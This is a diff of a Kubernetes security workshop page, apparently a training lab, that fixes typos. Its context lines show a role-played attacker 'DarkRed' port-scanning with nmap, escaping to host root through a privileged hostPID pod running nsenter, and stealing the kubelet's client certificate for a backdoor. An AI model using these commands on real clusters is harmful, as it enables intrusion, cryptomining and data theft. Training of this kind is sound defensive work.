@@ -10,7 +10,7 @@
       
       
       <link rel="shortcut icon" href="../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.1, mkdocs-material-6.1.4">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.4">
     
     
       
@@ -488,7 +488,7 @@
 <h2 id="backstory">Backstory<a class="headerlink" href="#backstory" title="Permanent link">&para;</a></h2>
 <h3 id="name-darkred">Name: <strong>DarkRed</strong><a class="headerlink" href="#name-darkred" title="Permanent link">&para;</a></h3>
 <ul>
-<li>Highly-Skilled</li>
+<li>Highly Skilled</li>
 <li>Sells Exfiltrated Data for $$</li>
 <li>Evades detection and employs persistence</li>
 <li>Uses env-specific tooling</li>
@@ -497,12 +497,12 @@
 </ul>
 <h3 id="motivations">Motivations<a class="headerlink" href="#motivations" title="Permanent link">&para;</a></h3>
 <ul>
-<li><strong>Red</strong> notices that the website is gone and the crypto-miners have stopped reporting in.</li>
+<li><strong>Red</strong> notices that the website is gone and the cryptominers have stopped reporting in.</li>
 <li><strong>Red</strong> asks <strong>DarkRed</strong> for help trying to get back into the Kubernetes cluster and gives <strong>DarkRed</strong> the IP address.</li>
 <li><strong>Red</strong> will split the revenue if <strong>DarkRed</strong> can get the miners back up and running.</li>
 </ul>
 <h2 id="initial-foothold">Initial Foothold<a class="headerlink" href="#initial-foothold" title="Permanent link">&para;</a></h2>
-<p>Seeing that the URL included port <code>31337</code> and that <strong>Red</strong> said it was a Kubernetes <code>cluster</code>, it was likely to be exposed via a <code>NodePort</code> <code>service</code>. With this information she has a feeling that more <code>services</code> might still be exposed to the web this way. <strong>DarkRed</strong> starts with indirect enumeration, such as searching on shodan.io, and follows up with direct portscanning via <code>nmap</code>.</p>
+<p>Seeing that the URL included port <code>31337</code> and that <strong>Red</strong> said it was a Kubernetes <code>cluster</code>, it was likely to be exposed via a <code>NodePort</code> <code>service</code>. With this information, she has a feeling that more <code>services</code> might still be exposed to the web this way. <strong>DarkRed</strong> starts with indirect enumeration, such as searching on shodan.io, and follows up with direct port scanning via <code>nmap</code>.</p>
 <p>To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to "nmap -sT -A -p 31300-31399 -T4 -n -v -Pn your-ip-address-goes-here". Be absolutely sure to scan your assigned IP address.</p>
 <p>Your Cloud Shell has a little script to help:
 <div class="highlight"><pre><span></span><code><span class="go">./attack-2-helper.sh</span>
@@ -527,7 +527,7 @@
 <span class="go">kubectl auth can-i --list</span>
 </code></pre></div>
 <p>Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims.</p>
-<p>Using <a href="https://twitter.com/mauilion/status/1129468485480751104" target="_blank">a neat trick from twitter</a>, let's attempt to deploy a container that gives us full host access:</p>
+<p>Using <a href="https://twitter.com/mauilion/status/1129468485480751104" target="_blank">a neat trick from Twitter</a>, let's attempt to deploy a container that gives us full host access:</p>
 <div class="highlight"><pre><span></span><code><span class="go">kubectl run r00t --restart=Never -ti --rm --image lol --overrides &#39;{&quot;spec&quot;:{&quot;hostPID&quot;: true, &quot;containers&quot;:[{&quot;name&quot;:&quot;1&quot;,&quot;image&quot;:&quot;alpine&quot;,&quot;command&quot;:[&quot;nsenter&quot;,&quot;--mount=/proc/1/ns/mnt&quot;,&quot;--&quot;,&quot;/bin/bash&quot;],&quot;stdin&quot;: true,&quot;tty&quot;:true,&quot;imagePullPolicy&quot;:&quot;IfNotPresent&quot;,&quot;securityContext&quot;:{&quot;privileged&quot;:true}}]}}&#39;</span>
 </code></pre></div>
 <p>Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special.</p>
@@ -547,7 +547,7 @@
 <h2 id="digging-in">Digging In<a class="headerlink" href="#digging-in" title="Permanent link">&para;</a></h2>
 <p>Now that <strong>DarkRed</strong> has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for "safekeeping".</p>
 <p>It would be nice to leave a backdoor for future access. Let's become <strong>DarkRed</strong> again and see what we can do:</p>
-<p>First, let's steal the kubelet's client certificate, and check to see if it has hightened permissions:</p>
+<p>First, let's steal the kubelet's client certificate, and check to see if it has heightened permissions:</p>
 <div class="highlight"><pre><span></span><code><span class="go">ps -ef | grep kubelet</span>
 </code></pre></div>
 <p>Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig</p>
